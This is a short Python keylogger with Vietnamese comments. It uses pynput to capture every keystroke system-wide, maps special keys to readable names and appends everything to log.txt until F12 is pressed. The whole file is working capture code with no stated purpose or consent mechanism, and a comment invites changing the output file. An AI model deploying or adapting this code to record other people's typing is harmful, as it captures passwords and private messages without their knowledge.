from pynput.keyboard import Listener

def anonymous(key):
    key = str(key);
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    
    # * Bàn phím bên trái:
    if key == "Key.esc":
        key = " esc\n"
    if key == "Key.f1":
        key = " f1\n"
    if key == "Key.f2":
        key = " f2\n"
    if key == "Key.f3":
        key = " f3\n"
    if key == "Key.f4":
        key = " f4\n"
    if key == "Key.f5":
        key = " f5\n"
    if key == "Key.f6":
        key = " f6\n"
    if key == "Key.f7":
        key = " f7\n"
    if key == "Key.f8":
        key = " f8\n"
    if key == "Key.f9":
        key = " f9\n"
    if key == "Key.f10":
        key = " f10\n"
    if key == "Key.f11":
        key = " f11\n"
    if key == "Key.insert":
        key = " insert\n"
    if key == "Key.delete":
        key = " delete\n"
    if key == "[`]":
        key = "`"
    if key == "Key.backspace":
        key = " backspace\n"
    if key == "Key.tab":
        key = "\n"
    if key == "Key.caps_lock":
        key = " caps_lock\n"
    if key == "Key.enter":
        key = "\n"
    if key == "Key.shift" or key == "Key.shift_r":
        key = " shift\n"
    if key == "Key.ctrl_l" or key == "Key.ctrl_r":
        key = " ctrl\n"
    if key == "Key.alt_l" or key == "Key.alt_gr":
        key = " alt\n"
    if key == "Key.cmd":
        key = " windows\n"
    if key == "Key.up":
        key = " up\n"
    if key == "Key.down":
        key = " down\n"
    if key == "Key.left":
        key = " left\n"
    if key == "Key.right":
        key = " right\n" 
    if key == "Key.page_up":
        key = " page_up\n"
    if key == "Key.page_down":
        key = " page_down\n"

    # * Bàn phím bên phải:
    if key == "<96>":
        key = "0"
    if key == "<97>":
        key = "1"
    if key == "<98>":
        key = "2"
    if key == "<99>":
        key = "3"
    if key == "<100>":
        key = "4"
    if key == "<101>":
        key = "5"
    if key == "<102>":
        key = "6"
    if key == "<103>":
        key = "7"
    if key == "<104>":
        key = "8"
    if key == "<105>":
        key = "9"
    if key == "<110>":
        key = "."
    if key == "Key.num_lock":
        key = " num_lock\n"

    # * Chỉnh sửa phần này thành file muốn in ra
    with open("log.txt", "a") as file:
       file.write(key)

with Listener(on_press = anonymous) as listener:
    listener.join()